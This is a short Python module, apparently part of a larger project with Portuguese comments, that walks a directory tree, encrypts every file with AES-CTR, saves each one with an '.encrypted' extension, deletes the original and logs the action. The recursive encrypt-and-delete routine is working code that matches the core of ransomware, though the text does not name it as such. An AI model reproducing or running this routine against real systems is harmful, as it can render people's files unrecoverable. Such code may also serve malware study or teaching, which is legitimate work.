import os
import pyaes
import logger
import config

def encrypt_file(file_path):
    # Salva o conteudo do arquivo em file_data para criptografar
    with open(file_path, "rb") as file:
        file_data = file.read()
    aes = pyaes.AESModeOfOperationCTR(config.KEY)
    encrypted_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado com o conteúdo do file_data e adicionar a extensão encrypted
    encrypted_file = file_path + ".encrypted"
    with open(encrypted_file, "wb") as enc_file:
        enc_file.write(encrypted_data)
    os.remove(file_path)
    logger.log_action("Encrypt", f"File encrypted: {file_path}")

def encrypt_directory(directory_path):
    for root, _, files in os.walk(directory_path):
        for file in files:
            encrypt_file(os.path.join(root,file))
    logger.log_action("Encrypt", f"Directory encrypted: {directory_path}")
